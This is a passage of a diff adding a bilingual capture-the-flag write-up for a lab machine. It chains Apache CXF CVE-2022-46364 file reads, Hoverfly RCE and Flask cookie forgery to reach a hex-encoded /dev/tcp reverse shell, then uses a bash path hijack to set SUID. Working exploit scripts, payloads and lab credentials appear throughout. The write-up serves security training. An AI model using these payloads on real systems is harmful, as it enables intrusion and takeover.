+    <span style="color:#61afef;">execve</span>(<span style="color:#98c379;">"/tmp/bash_real"</span>, argv, envp);
+    <span style="color:#c678dd;">return</span> <span style="color:#d19a66;">0</span>;
+}</code></pre>
+
+                <pre><code class="language-bash">gcc -o bashed xploit.c</code></pre>
+
+                <p>Transfer the binary to the victim machine, make a backup of the real bash, then overwrite
+                    <code>/usr/bin/bash</code>:</p>
+
+                <pre><code class="language-bash">cp /bin/bash /tmp/bash_real
+cp bashed /usr/bin/bash</code></pre>
+
+                <p>Now trigger the payload by running the allowed sudo command with a valid plugin argument:</p>
+
+                <pre><code class="language-bash">sudo /opt/syswatch/syswatch.sh plugin disk_monitor.sh</code></pre>
+
+                <p>The script calls <code>bash</code> as root, which resolves to the malicious
+                    <code>/usr/bin/bash</code>, which in turn sets the SUID bit on <code>/bin/bash</code>:</p>
+
+                <pre><code class="language-bash">ls -lah /bin/bash
+<span style="color:#98c379;">-rwsr-xr-x 1 root root 16K Mar 30 14:34 /bin/bash</span></code></pre>
+
+                <p>Finally, a privileged shell is obtained with <code>bash -p</code>, which preserves the effective UID,
+                    giving root access and the root flag:</p>
+
+                <pre><code class="language-bash">bash -p
+<span style="color:#98c379;">bash-5.2#</span> id
+<span style="color:#98c379;">uid=1001(dev_ryan) gid=1001(dev_ryan) euid=0(root) groups=1001(dev_ryan)</span></code></pre>
+            </div>
+
+            <!-- ==================== ESPAÑOL ==================== -->
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+
+                    <p>El ataque comenzó con un servicio SOAP Apache CXF 3.2.14 expuesto en el puerto 8080. Explotando
+                        <strong>CVE-2022-46364</strong>, una vulnerabilidad de Server-Side Request Forgery en el
+                        manejo de inclusiones XOP en CXF, se podían leer archivos arbitrarios del sistema de archivos
+                        del objetivo embebiendo URIs <code>file:///</code> dentro de peticiones SOAP multipart MTOM.
+                        Esto permitió leer <code>/proc/self/environ</code>, <code>/proc/&lt;pid&gt;/cmdline</code> y
+                        archivos de unidades systemd, que en conjunto revelaron credenciales para una instancia de
+                        Hoverfly corriendo en el puerto 8888.</p>
+
+                    <p>Hoverfly versión 1.11.3 es vulnerable a un RCE autenticado (GHSA-r4h8-hfp2-ggmf). Usando las
+                        credenciales recuperadas, se obtuvo una reverse shell como usuario <code>dev_ryan</code>. Con
+                        acceso a la máquina, se encontró una clave secreta de Flask en
+                        <code>/etc/syswatch.env</code>, lo que permitió falsificar una cookie de sesión válida para
+                        acceder a una interfaz web interna de SysWatch corriendo en <code>localhost:7777</code>.</p>
+
+                    <p>Esa interfaz contenía un endpoint de service-status vulnerable a inyección de comandos,
+                        protegido por un regex que bloqueaba letras mayúsculas — impidiendo el uso directo de
+                        <code>base64</code>. La restricción fue evadida usando <code>xxd</code> para codificar en
+                        hexadecimal el payload de la reverse shell, obteniendo acceso como usuario
+                        <code>syswatch</code>.</p>
+
+                    <p>La escalada de privilegios hasta root explotó una oportunidad de path hijacking:
+                        <code>/usr/bin/bash</code> tenía permisos de escritura para todos, y un script permitido por
+                        <code>sudo</code> llamaba a <code>bash</code> sin ruta absoluta. Reemplazando
+                        <code>/usr/bin/bash</code> con un binario C compilado que asigna el bit SUID a
+                        <code>/bin/bash</code> antes de ejecutar la shell real, triggereando el script vía
+                        <code>sudo</code> se obtuvo una bash con SUID, concediendo una shell de root.</p>
+
+                    <p><strong>Técnicas/Exploits:</strong> Apache CXF CVE-2022-46364 SSRF / lectura arbitraria de
+                        ficheros, Hoverfly RCE autenticado (GHSA-r4h8-hfp2-ggmf), falsificación de cookie de sesión
+                        Flask con <code>flask-unsign</code>, inyección de comandos con bypass hexadecimal mediante
+                        <code>xxd</code>, escalada de privilegios por path hijacking de bash.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en ejecución:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">21</span>/tcp   open  ftp     <span style="color:#98c379;">vsftpd 3.0.5</span>
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x 2 ftp ftp 4096 Sep 22 2025 pub
+<span style="color:#e06c75;">22</span>/tcp   open  ssh     <span style="color:#98c379;">OpenSSH 9.6p1 Ubuntu 3ubuntu13.15</span>
+<span style="color:#e06c75;">80</span>/tcp   open  http    <span style="color:#98c379;">Apache httpd 2.4.58</span>
+|_http-title: Did not follow redirect to http://devarea.htb/
+<span style="color:#e06c75;">8080</span>/tcp open  http    <span style="color:#98c379;">Jetty 9.4.27.v20200227</span>
+|_http-title: Error 404 Not Found
+<span style="color:#e06c75;">8500</span>/tcp open  http    <span style="color:#98c379;">Golang net/http server</span>
+<span style="color:#e06c75;">8888</span>/tcp open  http    <span style="color:#98c379;">Golang net/http server</span>
+|_http-title: Hoverfly Dashboard</code></pre>
+
+                <p>Hay varios servicios interesantes. El puerto 80 redirige a <code>devarea.htb</code> (añadido a
+                    <code>/etc/hosts</code>), que resulta ser una landing de contratación de desarrolladores sin nada
+                    obviamente explotable. Los servicios más interesantes son:</p>
+                <ul>
+                    <li>Puerto <strong>8080</strong>: Eclipse Jetty 9.4.27 — versión antigua, potencialmente vulnerable</li>
+                    <li>Puerto <strong>8500</strong>: Un proxy HTTP</li>
+                    <li>Puerto <strong>8888</strong>: Dashboard de <a href="https://github.com/SpectoLabs/Hoverfly">Hoverfly</a> — servicio de simulación de APIs</li>
+                    <li>Puerto <strong>21</strong>: FTP con login anónimo habilitado</li>
+                </ul>
+
+                <h3>Proxy en el Puerto 8500</h3>
+                <p>El puerto 8500 parece ser un proxy HTTP. Al intentar usarlo, devuelve un desafío de autenticación 407:</p>
+
+                <pre><code class="language-bash">curl -x http://devarea.htb:8500 http://10.10.14.129
+<span style="color:#e06c75;">407 Proxy authentication required</span></code></pre>
+
+                <p>La cabecera de respuesta <code>Proxy-Authenticate: Basic realm=hoverfly</code> revela que está
+                    vinculado al servicio Hoverfly. Si se encuentran credenciales para Hoverfly, este proxy podría
+                    usarse como pivote SSRF.</p>
+
+                <p><img src="./media/image4.png" alt="Respuesta 407 proxy authentication required del puerto 8500 mostrando el realm de Hoverfly" /></p>
+
+                <h3>Jetty en el Puerto 8080</h3>
+                <p>El servidor Jetty devuelve un 404 en la raíz, pero la versión es notable:
+                    <strong>9.4.27.v20200227</strong>. Dada esa fecha, es probable que esté desactualizado.</p>
+
+                <p><img src="./media/image6.png" alt="Página de error 404 de Eclipse Jetty 9.4.27 en el puerto 8080" /></p>
+
+                <h2>Enumeración FTP — employee-service.jar</h2>
+                <p>Conectándome al servidor FTP como usuario anónimo, hay un archivo disponible dentro del directorio
+                    <code>pub</code>:</p>
+
+                <pre><code class="language-plaintext">-rw-r--r-- 1 ftp ftp 6445030 Sep 22 2025 employee-service.jar</code></pre>
+
+                <p>Extrayéndolo con <code>unzip</code> se revelan clases Java compiladas bajo el paquete
+                    <code>htb/devarea</code>. Usando la extensión de VSCode "Extension Pack for Java" para
+                    decompilarlas, se ven cuatro clases:</p>
+
+                <pre><code class="language-java"><span style="color:#c678dd;">// EmployeeServiceImpl.java</span>
+<span style="color:#c678dd;">package</span> <span style="color:#e5c07b;">htb.devarea</span>;
+
+<span style="color:#c678dd;">public class</span> <span style="color:#e5c07b;">EmployeeServiceImpl</span> <span style="color:#c678dd;">implements</span> <span style="color:#e5c07b;">EmployeeService</span> {
+    <span style="color:#c678dd;">public</span> <span style="color:#e5c07b;">String</span> <span style="color:#61afef;">submitReport</span>(<span style="color:#e5c07b;">Report</span> report) {
+        <span style="color:#e5c07b;">String</span> greeting = report.<span style="color:#61afef;">isConfidential</span>()
+            ? <span style="color:#98c379;">"Report marked confidential. Thank you, "</span> + report.<span style="color:#61afef;">getEmployeeName</span>()
+            : <span style="color:#98c379;">"Report received from "</span> + report.<span style="color:#61afef;">getEmployeeName</span>();
+        <span style="color:#c678dd;">return</span> greeting + <span style="color:#98c379;">". Department: "</span> + report.<span style="color:#61afef;">getDepartment</span>()
+            + <span style="color:#98c379;">". Content: "</span> + report.<span style="color:#61afef;">getContent</span>();
+    }
+}</code></pre>
+
+                <pre><code class="language-java"><span style="color:#c678dd;">// Report.java</span>
+<span style="color:#c678dd;">package</span> <span style="color:#e5c07b;">htb.devarea</span>;
+
+<span style="color:#c678dd;">public class</span> <span style="color:#e5c07b;">Report</span> {
+    <span style="color:#c678dd;">private</span> <span style="color:#e5c07b;">String</span> employeeName;
+    <span style="color:#c678dd;">private</span> <span style="color:#e5c07b;">String</span> department;
+    <span style="color:#c678dd;">private</span> <span style="color:#e5c07b;">String</span> content;
+    <span style="color:#c678dd;">private boolean</span> confidential;
+    <span style="color:#c678dd;">// getters, setters y toString omitidos por brevedad</span>
+}</code></pre>
+
+                <pre><code class="language-java"><span style="color:#c678dd;">// EmployeeService.java</span>
+<span style="color:#c678dd;">package</span> <span style="color:#e5c07b;">htb.devarea</span>;
+<span style="color:#c678dd;">import</span> javax.jws.WebService;
+
+<span style="color:#56b6c2;">@WebService</span>(name = <span style="color:#98c379;">"EmployeeService"</span>, targetNamespace = <span style="color:#98c379;">"http://devarea.htb/"</span>)
+<span style="color:#c678dd;">public interface</span> <span style="color:#e5c07b;">EmployeeService</span> {
+    <span style="color:#e5c07b;">String</span> <span style="color:#61afef;">submitReport</span>(<span style="color:#e5c07b;">Report</span> var1);
+}</code></pre>
+
+                <pre><code class="language-java"><span style="color:#c678dd;">// ServerStarter.java</span>
+<span style="color:#c678dd;">package</span> <span style="color:#e5c07b;">htb.devarea</span>;
+<span style="color:#c678dd;">import</span> org.apache.cxf.jaxws.JaxWsServerFactoryBean;
+
+<span style="color:#c678dd;">public class</span> <span style="color:#e5c07b;">ServerStarter</span> {
+    <span style="color:#c678dd;">public static void</span> <span style="color:#61afef;">main</span>(<span style="color:#e5c07b;">String</span>[] args) {
+        <span style="color:#e5c07b;">JaxWsServerFactoryBean</span> factory = <span style="color:#c678dd;">new</span> <span style="color:#e5c07b;">JaxWsServerFactoryBean</span>();
+        factory.<span style="color:#61afef;">setServiceClass</span>(EmployeeService.class);
+        factory.<span style="color:#61afef;">setServiceBean</span>(<span style="color:#c678dd;">new</span> <span style="color:#e5c07b;">EmployeeServiceImpl</span>());
+        factory.<span style="color:#61afef;">setAddress</span>(<span style="color:#98c379;">"http://0.0.0.0:8080/employeeservice"</span>);
+        factory.<span style="color:#61afef;">create</span>();
+    }
+}</code></pre>
+
+                <p>Esto confirma que hay un servicio web SOAP en
+                    <code>http://devarea.htb:8080/employeeservice</code>, construido con <strong>Apache CXF</strong>.
+                    El WSDL es accesible en
+                    <a href="http://devarea.htb:8080/employeeservice?wsdl">http://devarea.htb:8080/employeeservice?wsdl</a>.
+                    Una petición de prueba confirma que el servicio funciona correctamente:</p>
+
+                <pre><code class="language-bash">curl -s -X POST http://devarea.htb:8080/employeeservice \
+  -H <span style="color:#98c379;">"Content-Type: text/xml;charset=UTF-8"</span> \
+  -H <span style="color:#98c379;">"SOAPAction: ''"</span> \
+  -d <span style="color:#98c379;">'&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+  xmlns:tns="http://devarea.htb/"&gt;
+  &lt;soapenv:Body&gt;
+    &lt;tns:submitReport&gt;
+      &lt;arg0&gt;
+        &lt;confidential&gt;false&lt;/confidential&gt;
+        &lt;content&gt;test&lt;/content&gt;
+        &lt;department&gt;IT&lt;/department&gt;
+        &lt;employeeName&gt;alice&lt;/employeeName&gt;
+      &lt;/arg0&gt;
+    &lt;/tns:submitReport&gt;
+  &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;'</span></code></pre>
+
+                <pre><code class="language-xml"><span style="color:#e06c75;">&lt;soap:Envelope</span> <span style="color:#d19a66;">xmlns:soap</span>=<span style="color:#98c379;">"http://schemas.xmlsoap.org/soap/envelope/"</span><span style="color:#e06c75;">&gt;</span>
+  <span style="color:#e06c75;">&lt;soap:Body&gt;</span>
+    <span style="color:#e06c75;">&lt;ns2:submitReportResponse</span> <span style="color:#d19a66;">xmlns:ns2</span>=<span style="color:#98c379;">"http://devarea.htb/"</span><span style="color:#e06c75;">&gt;</span>
+      <span style="color:#e06c75;">&lt;return&gt;</span>Report received from alice. Department: IT. Content: test<span style="color:#e06c75;">&lt;/return&gt;</span>
+    <span style="color:#e06c75;">&lt;/ns2:submitReportResponse&gt;</span>
+  <span style="color:#e06c75;">&lt;/soap:Body&gt;</span>
+<span style="color:#e06c75;">&lt;/soap:Envelope&gt;</span></code></pre>
+
+                <p>Los intentos iniciales con vectores como XXE, SSTI o payloads Log4Shell no producen resultados. El
+                    siguiente paso es comprobar las versiones de dependencias en el <code>pom.xml</code> del JAR:</p>
+
+                <pre><code class="language-xml"><span style="color:#e06c75;">&lt;cxf.version&gt;</span><span style="color:#98c379;">3.2.14</span><span style="color:#e06c75;">&lt;/cxf.version&gt;</span></code></pre>
+
+                <p>Apache CXF 3.2.14 es de 2020 — bastante antiguo. Consultando la lista de vulnerabilidades en
+                    <a href="https://www.cvedetails.com/version/780430/Apache-CXF-3.2.14.html">CVEDetails</a> se
+                    revelan varias vulnerabilidades SSRF aplicables a esta versión.</p>
+
+                <h2>Apache CXF SSRF — CVE-2022-46364 (Lectura Arbitraria de Ficheros)</h2>
+                <p>CVE-2022-46364 abusa del manejo de mensajes SOAP multipart MTOM (Message Transmission Optimization
+                    Mechanism) en CXF. Embebiendo un elemento XOP <code>Include</code> con una URI
+                    <code>file:///</code> como <code>href</code>, el servidor recupera el archivo local e incluye su
+                    contenido codificado en base64 en la respuesta SOAP. CVE-2024-28752 es otra vulnerabilidad
+                    aplicable con un enfoque similar — ambas se probaron y se confirmó que funcionan contra este
+                    objetivo.</p>
+
+                <pre><code class="language-bash">curl -s -X POST http://devarea.htb:8080/employeeservice \
+  -H <span style="color:#98c379;">'Content-Type: multipart/related; type="application/xop+xml"; start="&lt;root.message@cxf.apache.org&gt;"; start-info="text/xml"'</span> \
+  -H <span style="color:#98c379;">"SOAPAction: ''"</span> \
+  -d <span style="color:#98c379;">'--MIMEBoundary
+Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
+Content-Transfer-Encoding: 8bit
+Content-ID: &lt;root.message@cxf.apache.org&gt;
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+  xmlns:tns="http://devarea.htb/"&gt;
+  &lt;soapenv:Body&gt;
+    &lt;tns:submitReport&gt;
+      &lt;arg0&gt;
+        &lt;confidential&gt;false&lt;/confidential&gt;
+        &lt;content&gt;test&lt;/content&gt;
+        &lt;department&gt;IT&lt;/department&gt;
+        &lt;employeeName&gt;
+          &lt;inc:Include href="file:///etc/hostname" xmlns:inc="http://www.w3.org/2004/08/xop/include"/&gt;
+        &lt;/employeeName&gt;
+      &lt;/arg0&gt;
+    &lt;/tns:submitReport&gt;
+  &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;
+--MIMEBoundary--'</span></code></pre>
+
+                <pre><code class="language-plaintext">...Report received from <span style="color:#e5c07b;">ZGV2YXJlYQo=</span>. Department: IT. Content: test...</code></pre>
+
+                <pre><code class="language-bash">echo <span style="color:#98c379;">"ZGV2YXJlYQo="</span> | base64 -d
+<span style="color:#98c379;">devarea</span></code></pre>
+
+                <p>Lectura de ficheros confirmada. Para facilitar la explotación, creo un script bash que automatiza la
+                    petición y decodifica la respuesta en base64:</p>
+
+                <pre><code class="language-bash"><span style="color:#e06c75;">#!/bin/bash</span>
+<span style="color:#d19a66;">FILE</span>=<span style="color:#98c379;">${1:-/etc/hostname}</span>
+<span style="color:#d19a66;">TARGET</span>=<span style="color:#98c379;">"http://devarea.htb:8080/employeeservice"</span>
+
+<span style="color:#d19a66;">RESPONSE</span>=$(curl -s -X POST <span style="color:#98c379;">"$TARGET"</span> \
+  -H <span style="color:#98c379;">'Content-Type: multipart/related; type="application/xop+xml"; start="&lt;root.message@cxf.apache.org&gt;"; start-info="text/xml"'</span> \
+  -H <span style="color:#98c379;">"SOAPAction: ''"</span> \
+  -d <span style="color:#98c379;">"--MIMEBoundary
+Content-Type: application/xop+xml; charset=UTF-8; type=\"text/xml\"
+Content-Transfer-Encoding: 8bit
+Content-ID: &lt;root.message@cxf.apache.org&gt;
+
+&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;
+&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
+  xmlns:tns=\"http://devarea.htb/\"&gt;
+  &lt;soapenv:Body&gt;
+    &lt;tns:submitReport&gt;
+      &lt;arg0&gt;
+        &lt;confidential&gt;false&lt;/confidential&gt;
+        &lt;content&gt;test&lt;/content&gt;
+        &lt;department&gt;IT&lt;/department&gt;
+        &lt;employeeName&gt;
+          &lt;inc:Include href=\"file://${FILE}\" xmlns:inc=\"http://www.w3.org/2004/08/xop/include\"/&gt;
+        &lt;/employeeName&gt;
+      &lt;/arg0&gt;
+    &lt;/tns:submitReport&gt;
+  &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;
+--MIMEBoundary--"</span>)
+
+<span style="color:#d19a66;">B64</span>=$(echo <span style="color:#98c379;">"$RESPONSE"</span> | grep -oP <span style="color:#98c379;">'(?&lt;=from )[A-Za-z0-9+/=]+(?=\.)'</span>)
+
+<span style="color:#c678dd;">if</span> [[ -z <span style="color:#98c379;">"$B64"</span> ]]; <span style="color:#c678dd;">then</span>
+  echo <span style="color:#98c379;">"[-] No se encontró base64. Respuesta cruda:"</span>
+  echo <span style="color:#98c379;">"$RESPONSE"</span>
+  exit 1
+<span style="color:#c678dd;">fi</span>
+
+echo <span style="color:#98c379;">"[+] Leyendo: $FILE"</span>
+echo <span style="color:#98c379;">"---"</span>
+echo <span style="color:#98c379;">"$B64"</span> | base64 -d</code></pre>
+
+                <p>Comprobando <code>/etc/passwd</code> para identificar usuarios locales:</p>
+
+                <pre><code class="language-bash">./xploiter.sh /etc/passwd | grep sh
+<span style="color:#98c379;">root:x:0:0:root:/root:/bin/bash</span>
+<span style="color:#98c379;">dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash</span></code></pre>
+
+                <p>El usuario <code>dev_ryan</code> destaca. Leyendo <code>/proc/self/environ</code> se revela el
+                    entorno del proceso:</p>
+
+                <pre><code class="language-bash">./xploiter.sh /proc/self/environ
+<span style="color:#98c379;">[+] Leyendo: /proc/self/environ
+---
+LANG=en_US.UTF-8PATH=...USER=dev_ryanLOGNAME=dev_ryanHOME=/home/dev_ryan
+SHELL=/bin/bash...JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64</span></code></pre>
+
+                <p>El servicio Java se está ejecutando como <code>dev_ryan</code>. Haciendo fuerza bruta sobre los PIDs
+                    para leer <code>/proc/&lt;pid&gt;/cmdline</code> se descubren los argumentos del proceso de
+                    Hoverfly, que incluyen credenciales pasadas como flags en texto plano:</p>
+
+                <pre><code class="language-bash">for i in $(seq 1 12000); do echo "=== PID $i ==="; ./xploiter.sh /proc/$i/cmdline; done</code></pre>
+
+                <pre><code class="language-plaintext">[+] Leyendo: /proc/1487/cmdline
+---
+/opt/HoverFly/hoverfly<span style="color:#e06c75;">-add</span><span style="color:#e06c75;">-username</span><span style="color:#98c379;">admin</span><span style="color:#e06c75;">-password</span><span style="color:#98c379;">O7IJ27MyyXiU</span><span style="color:#e06c75;">-listen-on-host</span>0.0.0.0</code></pre>
+
+                <p>Credenciales encontradas: <code>admin:O7IJ27MyyXiU</code>. También se pueden confirmar leyendo el
+                    fichero de unidad systemd directamente, que presenta la información de forma aún más clara:</p>
+
+                <pre><code class="language-bash">./xploiter.sh /etc/systemd/system/hoverfly.service</code></pre>
+
+                <pre><code class="language-ini"><span style="color:#e06c75;">[Unit]</span>
+Description=HoverFly service
+After=network.target
+
+<span style="color:#e06c75;">[Service]</span>
+<span style="color:#d19a66;">User</span>=dev_ryan
+<span style="color:#d19a66;">Group</span>=dev_ryan
+<span style="color:#d19a66;">WorkingDirectory</span>=/opt/HoverFly
+<span style="color:#d19a66;">ExecStart</span>=/opt/HoverFly/hoverfly <span style="color:#e06c75;">-add</span> <span style="color:#e06c75;">-username</span> <span style="color:#98c379;">admin</span> <span style="color:#e06c75;">-password</span> <span style="color:#98c379;">O7IJ27MyyXiU</span> <span style="color:#e06c75;">-listen-on-host</span> 0.0.0.0
+<span style="color:#d19a66;">Restart</span>=on-failure</code></pre>
+
+                <h2>Hoverfly RCE — GHSA-r4h8-hfp2-ggmf</h2>
+                <p>Accediendo al dashboard de Hoverfly en el puerto 8888 con las credenciales encontradas se revela la
+                    versión <strong>1.11.3</strong>. Los avisos de seguridad de Hoverfly en
+                    <a href="https://github.com/SpectoLabs/hoverfly/security">https://github.com/SpectoLabs/hoverfly/security</a>
+                    listan una vulnerabilidad de RCE autenticado que afecta a versiones hasta 1.11.3 inclusive:
+                    <a href="https://github.com/advisories/GHSA-r4h8-hfp2-ggmf">GHSA-r4h8-hfp2-ggmf</a>.</p>
+
+                <p>Usando Burp Suite para enviar la petición del exploit, el RCE queda confirmado — la salida al final
+                    del cuerpo de la respuesta muestra <code>STDOUT:\ndev_ryan</code>:</p>
+
+                <p><img src="./media/image3.png" alt="Petición en Burp Suite demostrando el RCE autenticado en Hoverfly 1.11.3, con STDOUT mostrando dev_ryan en la respuesta" /></p>
+
+                <p>Con el RCE confirmado, se envía un payload de reverse shell a través del mismo endpoint, obteniendo
+                    una shell como <code>dev_ryan</code> y pudiendo recuperar la flag de usuario.</p>
+
+                <h2>Movimiento Lateral — Interfaz Web SysWatch</h2>
+                <p>Comprobando los privilegios <code>sudo</code> de <code>dev_ryan</code>:</p>
+
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <pre><code class="language-plaintext">User dev_ryan may run the following commands on devarea:
+    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh web-stop, !/opt/syswatch/syswatch.sh web-restart</code></pre>
+
+                <p><code>dev_ryan</code> puede ejecutar <code>syswatch.sh</code> como root, pero los subcomandos
+                    <code>web-stop</code> y <code>web-restart</code> están explícitamente denegados. Los comandos
+                    disponibles incluyen <code>web-status</code>, <code>plugin</code>, <code>logs</code> y otros.
+                    Ejecutando <code>web-status</code> se muestra una aplicación Python corriendo en el puerto 7777:</p>
+
+                <pre><code class="language-bash">sudo /opt/syswatch/syswatch.sh web-status</code></pre>
+
+                <pre><code class="language-plaintext">● syswatch-web.service - SysWatch Web GUI
+   Active: active (running)
+   Main PID: 1462 (python)
+   CGroup: /system.slice/syswatch-web.service
+           └─1462 /opt/syswatch/venv/bin/python /opt/syswatch/syswatch_gui/app.py</code></pre>
+
+                <p>Este servicio solo escucha en localhost. Para acceder a él, añado mi clave pública SSH a
+                    <code>~/.ssh/authorized_keys</code> y hago port forwarding:</p>
+
+                <pre><code class="language-bash">ssh -L 7777:127.0.0.1:7777 dev_ryan@devarea.htb</code></pre>
+
+                <p>El fichero de unidad systemd de este servicio revela un fichero de entorno importante:</p>
+
+                <pre><code class="language-bash">cat /etc/systemd/system/syswatch-web.service</code></pre>
+
+                <pre><code class="language-ini"><span style="color:#e06c75;">[Service]</span>
+<span style="color:#d19a66;">User</span>=syswatch
+<span style="color:#d19a66;">EnvironmentFile</span>=/etc/syswatch.env
+<span style="color:#d19a66;">ExecStart</span>=/opt/syswatch/venv/bin/python /opt/syswatch/syswatch_gui/app.py</code></pre>
+
+                <pre><code class="language-bash">cat /etc/syswatch.env</code></pre>
+
+                <pre><code class="language-plaintext">SYSWATCH_SECRET_KEY=f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725
+SYSWATCH_ADMIN_PASSWORD=SyswatchAdmin2026
+SYSWATCH_LOG_DIR=/opt/syswatch/logs
+SYSWATCH_DB_PATH=/opt/syswatch/syswatch_gui/syswatch.db
+SYSWATCH_PLUGIN_DIR=/opt/syswatch/plugins
+SYSWATCH_BACKUP_DIR=/opt/syswatch/backup
+SYSWATCH_VERSION=1.0.0</code></pre>
+
+                <p>El <code>SYSWATCH_ADMIN_PASSWORD</code> y las credenciales de una base de datos SQLite encontrada en
+                    un archivo <code>syswatch-v1.zip</code> en el home de <code>dev_ryan</code> fueron probados contra
+                    el formulario de login en <code>localhost:7777</code> — ninguno funciona.</p>
+
+                <p>Sin embargo, la <strong>clave secreta de Flask</strong> está disponible. Como el código fuente
+                    (encontrado en el archivo zip) muestra que solo se necesita una cookie de sesión válida con un campo
+                    <code>user_id</code> para autenticarse, se puede falsificar una cookie usando
+                    <code>flask-unsign</code>:</p>
+
+                <pre><code class="language-bash">flask-unsign --sign --cookie <span style="color:#98c379;">"{'username': 'admin', 'user_id': 1}"</span> \
+  --secret f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725</code></pre>
+
+                <pre><code class="language-plaintext">eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl9pZCI6MX0.ack8Fw.l_NXlrXPNNYq8-uRyP6zYR2fueI</code></pre>
+
+                <p>Inyectando esta cookie en el navegador se obtiene acceso al dashboard de SysWatch:</p>
+
+                <p><img src="./media/image2.png" alt="Dashboard web de SysWatch accesible tras inyectar una cookie de sesión Flask falsificada" /></p>
+
+                <h2>Inyección de Comandos — Bypass Hexadecimal con xxd</h2>
+                <p>El endpoint más interesante de la interfaz SysWatch es <strong>service-status</strong>, que parece
+                    ejecutar <code>systemctl status</code> sobre un nombre de servicio proporcionado por el usuario:</p>
+
+                <p><img src="./media/image1.png" alt="Interfaz service-status de SysWatch mostrando un campo de entrada para el nombre del servicio" /></p>
+
+                <p>Revisando el código fuente del archivo zip se revela la implementación del backend:</p>
+
+                <pre><code class="language-python"><span style="color:#d19a66;">SAFE_SERVICE</span> = re.<span style="color:#61afef;">compile</span>(<span style="color:#98c379;">r"^[^;/\&amp;.&lt;&gt;\rA-Z]*$"</span>)
+
+<span style="color:#c678dd;">if not</span> service <span style="color:#c678dd;">or not</span> SAFE_SERVICE.<span style="color:#61afef;">match</span>(service):
+    error = <span style="color:#98c379;">"Invalid service name"</span>
+<span style="color:#c678dd;">else</span>:
+    <span style="color:#c678dd;">try</span>:
+        res = subprocess.<span style="color:#61afef;">run</span>(
+            [<span style="color:#98c379;">f"systemctl status --no-pager {service}"</span>],
+            shell=<span style="color:#e5c07b;">True</span>, capture_output=<span style="color:#e5c07b;">True</span>, text=<span style="color:#e5c07b;">True</span>, timeout=<span style="color:#d19a66;">10</span>
+        )</code></pre>
+
+                <p>El parámetro <code>service</code> se pasa sin sanitizar a un comando de shell. El regex bloquea
+                    punto y coma, barras, ampersands, puntos, corchetes angulares, retornos de carro y
+                    <strong>letras mayúsculas</strong>. El frontend añade comprobaciones adicionales del lado del cliente
+                    (por ejemplo, bloqueando <code>$()</code>), pero estas se pueden bypassear mediante Burp Suite —
+                    el backend no tiene esa restricción.</p>
+
+                <p>La restricción clave es que <code>base64</code> contiene letras mayúsculas (<code>B</code>,
+                    <code>A</code>...) y por lo tanto está bloqueado. La técnica clásica de codificar el payload en
+                    base64 no va a funcionar. Sin embargo, <code>xxd</code> proporciona una vía equivalente usando
+                    únicamente hex en minúsculas:</p>
+
+                <pre><code class="language-bash"><span style="color:#c678dd;"># Codificar un comando a hexadecimal</span>
+echo -n <span style="color:#98c379;">"id"</span> | xxd -p
+<span style="color:#98c379;">6964</span>
+
+<span style="color:#c678dd;"># Decodificar hex de vuelta al comando</span>
+echo -n <span style="color:#98c379;">"6964"</span> | xxd -p -r
+<span style="color:#98c379;">id</span></code></pre>
+
+                <p>Usando esta técnica, el comando de reverse shell se codifica en hexadecimal y se inyecta mediante
+                    Burp Suite:</p>
+
+                <p><img src="./media/image5.png" alt="Petición en Burp Suite mostrando el payload de inyección de comandos basado en xxd en el parámetro service" /></p>
+
+                <p>El payload completo, con codificación URL para el cuerpo del POST:</p>
+
+                <pre><code class="language-plaintext">service=$(echo%20"62617368202d63202262617368202d69203e26202f6465762f7463702f31302e31302e31342e3132392f34343320303e263122"|xxd%20-p%20-r|bash)</code></pre>
+
+                <p>Esto decodifica y ejecuta: <code>bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.129/443 0&gt;&amp;1"</code></p>
+
+                <p>Se obtiene una shell como usuario <code>syswatch</code>. Este usuario tiene acceso a
+                    <code>/opt/syswatch</code> pero el acceso de escritura se limita a
+                    <code>/opt/syswatch/logs</code> y <code>/opt/syswatch/backup</code>. No hay nada más útil
+                    desde este usuario, así que el foco se desplaza a la escalada de privilegios.</p>
+
+                <h2>Escalada de Privilegios — Path Hijacking de Bash</h2>
+                <p>Analizando <code>/opt/syswatch/syswatch.sh</code>, las líneas 95 y 97 invocan <code>bash</code>
+                    sin ruta absoluta:</p>
+
+                <pre><code class="language-bash"><span style="color:#c678dd;">if</span> [ <span style="color:#98c379;">"$run_root"</span> -eq 1 ]; <span style="color:#c678dd;">then</span>
+    bash <span style="color:#98c379;">"$fullpath"</span> <span style="color:#98c379;">"$@"</span>
+<span style="color:#c678dd;">else</span>
+    runuser -u <span style="color:#98c379;">"$SYSWATCH_USER"</span> -- bash <span style="color:#98c379;">"$fullpath"</span> <span style="color:#98c379;">"$@"</span>
+<span style="color:#c678dd;">fi</span></code></pre>
+
+                <p>El <code>secure_path</code> de sudo es:</p>
+
+                <pre><code class="language-plaintext">secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin</code></pre>
+
